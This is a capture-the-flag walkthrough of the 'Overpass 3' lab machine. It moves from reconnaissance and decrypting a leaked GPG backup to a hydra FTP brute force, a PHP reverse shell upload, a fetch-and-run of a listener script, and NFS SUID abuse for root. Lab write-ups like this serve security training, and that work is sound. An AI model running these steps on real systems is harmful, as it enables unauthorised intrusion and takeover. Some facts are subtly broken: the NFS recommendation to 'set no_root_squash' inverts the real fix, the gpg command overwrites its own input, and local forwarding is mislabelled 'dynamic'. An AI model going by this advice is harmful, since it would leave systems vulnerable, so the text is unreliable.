Walkthrough: Overpass 3 – Hosting
=====================================================
A detailed technical write-up detailing the compromise of the Overpass 3 – Hosting target machine. This report walks through initial reconnaissance, sensitive data exposure via exposed backups, web exploitation, dynamic port forwarding, NFS abuse, and privilege escalation to complete root takeover. Remediations and strategic recommendations are provided to address the underlying security vulnerabilities.

Executive Summary
----------------
During the assessment of Overpass 3, multiple severe misconfigurations and security vulnerabilities were identified:
- Unsecured Web Directory: A zip file containing an encrypted backup was accessible without authentication via directory listing.
- Hardcoded Cryptographic Keys: Private GPG keys were included in public-facing backup archives, allowing decryption of sensitive corporate and customer data.
- Reused Credentials & Insecure File Uploads: Valid FTP credentials extracted from decrypted customer data allowed unauthorized file uploads to the web root, resulting in Remote Code Execution (RCE).
- Misconfigured NFS Shares: An NFS export configured with weak squashing settings allowed an attacker to abuse SetUID permissions via local port forwarding to achieve root escalation.

**Technical Walkthrough**
-------------------------
Phase 1: Network Reconnaissance
-------------------------------
An initial port scan using nmap identified exposed services running on standard ports, including FTP, SSH, and HTTP.
```
nmap -sS -sC -sV -p 21,22,80 TARGET_IP
```
- Output
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-04 12:31 UTC
Nmap scan report for ip-10-128-176-51.eu-west-3.compute.internal (TARGET_IP)
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-title: Overpass Hosting
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Phase 2: Web Enumeration & Sensitive Information Disclosure
-----------------------------------------------------------
Visiting the web root http://TARGET_IP served the main Overpass Hosting home page. 

<img width="947" height="371" alt="overpass3_0_web_home" src="https://github.com/user-attachments/assets/4ee615ad-87f0-48c3-a3e9-58235bac98c7" />

Directory enumeration was performed using gobuster to find hidden paths.
```
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -z
```
- Output
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 237] [--> http://TARGET_IP/backups/]
/cgi-bin/             (Status: 403) [Size: 217]
/index.html           (Status: 200) [Size: 1770]
===============================================================
Finished
===============================================================
```
- The /backups directory contained an accessible zip file named backup.zip. After downloading and extracting the file, it yielded a GPG-encrypted spreadsheet (CustomerDetails.xlsx.gpg) along with a private GPG key (priv.key).

Decrypting Customer Data
- The private key was imported into GPG to decrypt the spreadsheet:
```
unzip backup.zip
gpg --list-keys
gpg --import priv.key
gpg --list-secret-key
gpg -o CustomerDetails.xlsx.gpg -d CustomerDetails.xlsx.gpg
```
- Using Python's pandas library, the spreadsheet contents were extracted, disclosing sensitive customer data and plaintext credentials:
```
pip install pandas openpyxl
python3 -c "import pandas as pd; print(pd.read_excel('CustomerDetails.xlsx'))"
```
<img width="588" height="114" alt="overpass3_0_excel_data" src="https://github.com/user-attachments/assets/30dc4c83-b5a6-45a9-a1b1-27122b552eb4" />

Phase 3: Exploitation & Initial Access
-------------------------------------
Credential Bruteforce & FTP Upload
- Using the user lists and passwords harvested from the decrypted customer records, an authentication brute-force attack was launched against the FTP service using hydra.
```
hydra -L username.txt -P passwd.txt TARGET_IP ftp
```
- Valid FTP credentials were found. Logging in via FTP confirmed that the FTP root directory coincided with the Apache web root.

<img width="551" height="351" alt="overpass3_0_ftp_login" src="https://github.com/user-attachments/assets/1adfc90d-c3b8-4571-9dc7-225bb6983184" />

Reverse Shell Payload Deployment
- A standard PHP reverse shell payload was generated [PentestMonkey](https://www.revshells.com/).
- To receive the connection, an automated listener was established locally using penelope.py:
```
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```
- The reverse shell (shell.php) was uploaded via FTP directly to the web directory.

<img width="548" height="289" alt="overpass3_0_php_shell" src="https://github.com/user-attachments/assets/837d45af-62f5-4ccf-a2c2-a94c2f635fb0" />

- Navigating to http://TARGET_IP/shell.php triggered the execution, establishing a reverse shell callback as the apache web user context.

<img width="923" height="101" alt="overpass3_0_shell_invoke" src="https://github.com/user-attachments/assets/469361ca-f44e-472a-bfaf-bc6c6105bcfd" />

Phase 4: Local Enumeration & Internal Tunneling
-----------------------------------------------
After establishing an initial shell as apache, local users were enumerated.

<img width="556" height="314" alt="overpass3_1_apache_user" src="https://github.com/user-attachments/assets/d7f8be32-1de1-4cad-a969-16e111f8d70d" />


```
cat /etc/passwd | grep -i apache
find / -type f -name web* 2>/dev/null
```
- The target host contained a standard user account named paradox.
```
su paradox
find / -xdev -type f -user paradox 2>/dev/null
```

NFS Share Discovery
- Interrogating local network configurations and exports revealed an internal NFS export active on port 2049, bound to localhost:
```
cat /etc/exports
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount TARGET_IP
rpcinfo -p
```
- Because NFS was isolated from direct external connections, SSH dynamic port forwarding was established using an SSH key pair generated for paradox.

- On local host
```
ssh-keygen -t rsa -b 2048 -f paradox_rsa
```
- Forward target NFS port locally
```
ssh paradox@TARGET_IP -L 2049:localhost:2049 -fN -i paradox_rsa
```
- Mount the internal NFS share locally
```
mkdir /tmp/james_share
mount -v -t nfs localhost:/ /tmp/james_share
```
- The NFS export revealed the contents of the /home/james directory.

Phase 5: Privilege Escalation to Root
-------------------------------------
Inspecting the mounted NFS share allowed extraction of James' private SSH key (/home/james/.ssh/id_rsa). Using this key, direct SSH access was gained as the james user.

SetUID Abuse over NFS
- NFS exports configured without no_root_squash or with permissive ownership controls allow local root execution mapping. To leverage this for full root escalation:
- On Target Machine: Copy the /bin/bash binary into the shared NFS directory and set the SUID permission bit.
```
cp /bin/bash bash
chmod +x bash
chmod +s bash
```
- On Attacker/Local Host: Modify ownership of the binary on the mounted NFS share to root:root.
```
chown root:root bash
```
- On Target Machine: Execute the SUID binary with the -p parameter to preserve privileges:
```
./bash -p
```
- The shell executed with full effective UID 0 (root), yielding full system compromise.

Recommendations
---------------
- Remove Exposed Backups from Web Directories: Never store system, site, or database backups within public web-accessible roots (/var/www/html/). Restrict access or relocate backups outside web-accessible scopes.
- Key Management & Cryptographic Hygiene: Never store GPG private keys alongside encrypted data assets or inside public archives. Store private keys strictly within secure secrets managers or Hardware Security Modules (HSMs).
- FTP Access Controls: Replace insecure plain-text FTP with SFTP/SSH. Ensure user directories are jailed using chroot configurations so uploaded files cannot execute directly in web roots.
- NFS Security Hardening: Restrict NFS access strictly to authorized IPs. Ensure all NFS exports set no_root_squash to prevent elevated permission mounting and include nosuid flags in mount parameters to prevent SUID abuse.
- Enforce Password & Credential Isolation: Enforce distinct strong password policies across separate service tiers to prevent service-hopping (e.g., customer account reuse leading to shell access).
